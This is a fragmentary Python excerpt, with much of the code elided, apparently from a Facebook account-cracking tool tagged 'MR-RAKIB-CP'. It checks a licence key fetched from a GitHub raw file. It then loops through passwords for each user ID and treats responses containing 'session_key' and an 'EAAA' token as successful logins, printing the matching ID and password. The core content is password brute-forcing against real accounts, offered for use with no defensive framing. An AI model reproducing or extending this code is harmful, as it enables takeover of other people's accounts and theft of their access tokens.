...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://raw.githubusercontent.com/BLACK-HUNTER-TEEM/BHT-PRO-v1/main/Apruve.txt")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/BLACK-HUNTER-TEEM/BHT-PRO-v1/main/Apruve.txtt').text
			if basesplit in plr:
				key = basesplit
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;91m   [MR-RAKIB-CP] %s | %s\033[0;97m         "%(uid, pw))
